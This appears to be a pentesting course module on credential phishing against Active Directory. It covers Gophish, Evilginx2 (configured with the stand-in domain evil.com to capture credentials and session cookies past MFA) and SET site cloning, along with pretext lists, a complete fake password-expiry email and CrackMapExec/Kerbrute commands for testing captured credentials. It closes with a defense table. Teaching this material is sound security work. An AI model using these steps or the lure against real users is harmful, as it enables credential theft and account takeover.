# Phishing for Credentials

## Unit 3 - Topic 2 | Initial Access Scenarios

---

## Overview

**Phishing for credentials** is a social engineering technique targeting AD environments by crafting convincing emails or web pages that trick users into revealing their domain credentials. It's often the entry point for internal AD attacks.

---

## 1. Phishing Attack Workflow

```
CREDENTIAL PHISHING PIPELINE:

1. RECONNAISSANCE
   ├── Gather employee emails (OSINT)
   ├── Identify email format (first.last@corp.com)
   ├── Map organizational structure
   └── Identify high-value targets

2. INFRASTRUCTURE SETUP
   ├── Register look-alike domain
   │   corp-login.com, c0rp.com, corp.co
   ├── Set up phishing server
   ├── Configure SSL certificate
   ├── Set up email server (SMTP)
   └── Configure DNS (SPF, DKIM optional)

3. CRAFT PAYLOAD
   ├── Clone target login page
   ├── Create convincing email template
   ├── Add urgency/authority trigger
   └── Test in isolated environment

4. LAUNCH CAMPAIGN
   ├── Send phishing emails
   ├── Monitor credential captures
   ├── Validate captured credentials
   └── Pivot to internal network

5. POST-CAPTURE
   ├── Test credentials against AD
   ├── Check group memberships
   ├── Identify accessible resources
   └── Begin internal enumeration
```

---

## 2. Phishing Tools and Techniques

```bash
# === GOPHISH (Campaign Management) ===
# Setup:
./gophish    # Starts on https://localhost:3333

# Workflow:
# 1. Sending Profiles: Configure SMTP server
# 2. Landing Pages: Clone target login page
# 3. Email Templates: Create convincing email
# 4. Users & Groups: Import target email list
# 5. Campaigns: Launch and track results

# === EVILGINX2 (Reverse Proxy - Bypasses MFA) ===
# How it works:
# User → Evilginx (proxy) → Real Login Server
# Captures credentials AND session cookies
# Works against:
#   - SMS-based MFA
#   - TOTP (Google Auth, Authy)
#   - Push notifications (sometimes)
# Does NOT work against:
#   - FIDO2/WebAuthn (hardware keys)
#   - Client certificate authentication

# Setup:
evilginx2
: config domain evil.com
: config ip 10.0.0.5
: phishlets hostname o365 login.evil.com
: phishlets enable o365
: lures create o365
: lures get-url 0
# Share generated URL with target

# === SET (Social Engineering Toolkit) ===
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester
# 4) Site Cloner
# Enter target URL: https://mail.corp.com/owa
# SET clones the page and captures POSTed credentials
```

---

## 3. Email Template Strategies

```
EFFECTIVE PHISHING PRETEXTS:

IT DEPARTMENT:
├── "Password expiration notice"
├── "Required security update"
├── "New VPN access portal"
├── "Email storage quota exceeded"
└── "Multi-factor authentication setup required"

HR/MANAGEMENT:
├── "Updated employee handbook"
├── "Benefits enrollment deadline"
├── "Performance review system access"
├── "Salary adjustment notification"
└── "Company policy update - action required"

URGENT/FEAR:
├── "Unusual login detected on your account"
├── "Account will be suspended in 24 hours"
├── "Failed payment notification"
├── "Legal document requiring immediate review"
└── "Security breach - verify your identity"

EXAMPLE EMAIL:
┌──────────────────────────────────────────────┐
│ From: IT-Support@corp-secure.com             │
│ Subject: Action Required: Password Expires   │
│ in 24 Hours                                  │
│                                              │
│ Dear [First Name],                           │
│                                              │
│ Your corporate password will expire on       │
│ [date]. To avoid losing access to email and  │
│ internal systems, please update your         │
│ password using the link below:               │
│                                              │
│ [Update Password Now]                        │
│                                              │
│ If you don't update within 24 hours, your    │
│ account will be temporarily suspended.       │
│                                              │
│ IT Support Team                              │
│ helpdesk@corp.com | ext. 5555                │
└──────────────────────────────────────────────┘
```

---

## 4. Post-Capture Credential Validation

```bash
# === VALIDATE CAPTURED CREDENTIALS ===

# CrackMapExec (test against SMB):
crackmapexec smb dc01 -u captured_user -p captured_pass
# [+] corp\user:pass (Pwn3d!) = admin access
# [+] corp\user:pass = valid, not admin
# [-] corp\user:pass = invalid

# Kerbrute (test via Kerberos):
kerbrute bruteuser -d corp.local -dc dc01 \
  captured_pass username_list.txt
# Quieter than SMB; doesn't trigger SMB-based detections

# Impacket:
GetADUsers.py corp.local/user:pass -dc-ip dc01

# If valid, enumerate immediately:
crackmapexec smb dc01 -u user -p pass --users
crackmapexec smb dc01 -u user -p pass --shares
bloodhound-python -u user -p pass -d corp.local \
  -ns dc01_ip -c all
```

---

## 5. Phishing Defense

| Defense | Description |
|---------|-------------|
| **Security awareness** | Regular phishing simulations and training |
| **Email filtering** | Block suspicious URLs and attachments |
| **DMARC/DKIM/SPF** | Prevent domain spoofing |
| **FIDO2 keys** | Phishing-resistant MFA (blocks Evilginx) |
| **URL filtering** | Block newly registered domains |
| **Conditional access** | Restrict login from unknown devices/locations |
| **Report button** | Easy way for users to report suspicious emails |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **GoPhish** | Full phishing campaign management |
| **Evilginx2** | Reverse proxy that bypasses most MFA |
| **SET** | Quick credential harvester setup |
| **FIDO2** | Only MFA type that stops proxy phishing |
| **Validation** | Test creds with CrackMapExec/Kerbrute |
| **Best pretext** | Urgency + authority + relevance |

---

## Quick Revision Questions

1. **How does Evilginx2 bypass multi-factor authentication?**
2. **What MFA method is resistant to reverse proxy phishing?**
3. **What makes a phishing email more convincing?**
4. **How do you validate captured AD credentials?**
5. **What email security controls prevent domain spoofing?**

---

[← Previous: Credential Harvesting](01-credential-harvesting.md) | [Next: Password Spraying →](03-password-spraying.md)

---

*Unit 3 - Topic 2 of 6 | [Back to README](../README.md)*
